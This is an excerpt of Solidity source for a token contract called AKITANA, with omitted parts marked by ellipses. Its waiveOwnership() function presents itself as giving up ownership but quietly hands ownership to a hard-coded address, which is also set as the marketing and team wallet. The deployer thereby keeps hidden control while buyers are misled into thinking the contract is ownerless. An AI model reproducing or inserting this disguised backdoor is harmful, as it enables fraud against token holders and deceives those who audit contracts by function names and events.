...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x478A81A3612fcb4C5a582Ad7E7EF4E08d4f03426));
        _owner = address(0x478A81A3612fcb4C5a582Ad7E7EF4E08d4f03426);
    }
...
contract  Akitana is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AKITANA";
    string private _symbol = "AKITANA";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x478A81A3612fcb4C5a582Ad7E7EF4E08d4f03426);
    address payable public teamWalletAddress = payable(0x478A81A3612fcb4C5a582Ad7E7EF4E08d4f03426);
